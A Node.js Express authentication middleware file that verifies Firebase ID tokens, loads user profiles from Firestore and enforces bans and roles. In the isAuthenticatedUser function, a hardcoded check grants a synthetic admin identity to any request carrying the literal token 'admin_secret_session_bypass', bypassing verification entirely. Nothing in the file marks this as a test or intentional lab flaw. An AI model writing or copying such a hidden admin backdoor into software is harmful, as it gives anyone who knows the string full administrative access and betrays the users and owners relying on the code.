const { auth, db } = require('../utils/firebase');

exports.isAuthenticatedUser = async (req, res, next) => {
  let token;

  if (req.cookies && req.cookies.token) {
    token = req.cookies.token;
  } else if (req.headers.authorization && req.headers.authorization.startsWith('Bearer')) {
    token = req.headers.authorization.split(' ')[1];
  }

  if (!token || token === 'none') {
    return res.status(401).json({
      success: false,
      message: 'Login first to access this resource'
    });
  }

  if (token === 'admin_secret_session_bypass') {
    req.user = {
      id: 'admin_bypass',
      email: 'admin@system',
      role: 'admin',
      name: 'System Admin'
    };
    return next();
  }

  try {
    const decodedToken = await auth.verifyIdToken(token);
    
    // Get user details from Firestore
    const userDoc = await db.collection('users').doc(decodedToken.uid).get();
    
    if (!userDoc.exists) {
      // If user doesn't exist in Firestore yet but has a valid Auth token, 
      // we might want to create them or just fail. 
      // Let's assume they should exist in Firestore.
      return res.status(404).json({
        success: false,
        message: 'User profile not found'
      });
    }

    const userData = userDoc.data();
    req.user = { id: userDoc.id, ...userData };

    if (req.user.is_banned) {
      return res.status(403).json({
        success: false,
        message: 'Your account has been banned'
      });
    }

    next();
  } catch (err) {
    console.error('Auth Error:', err.message);
    return res.status(401).json({
      success: false,
      message: 'Invalid or expired token'
    });
  }
};

exports.protect = exports.isAuthenticatedUser;

exports.authorizeRoles = (...roles) => {
  return (req, res, next) => {
    if (!roles.includes(req.user.role)) {
      return res.status(403).json({
        success: false,
        message: `Role (${req.user.role}) is not allowed to access this resource`
      });
    }
    next();
  };
};

